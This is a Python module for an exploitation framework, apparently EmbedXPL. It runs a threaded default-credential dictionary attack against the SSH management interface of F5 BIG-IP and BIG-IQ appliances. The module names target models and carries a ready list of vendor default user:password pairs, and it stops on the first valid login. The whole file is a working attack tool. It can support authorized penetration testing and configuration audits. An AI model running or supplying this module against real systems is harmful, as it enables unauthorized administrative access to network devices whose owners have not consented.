# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """F5 BIG-IP Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "F5 BIG-IP Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against F5 BIG-IP SSH. "
            "Covers lower-end SMB models (BIG-IP LTM 2000s/4000s) often deployed "
            "in branch/SMB environments. F5 BIG-IP ships with known default credentials "
            "on the management interface. Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "F5 BIG-IP LTM 2000s / 2200s / 4000s / 4200v",
            "F5 BIG-IP (all models, default config)",
            "F5 BIG-IQ (management platform)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "admin:admin,root:default,admin:f5networks,root:f5networks,admin:password",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
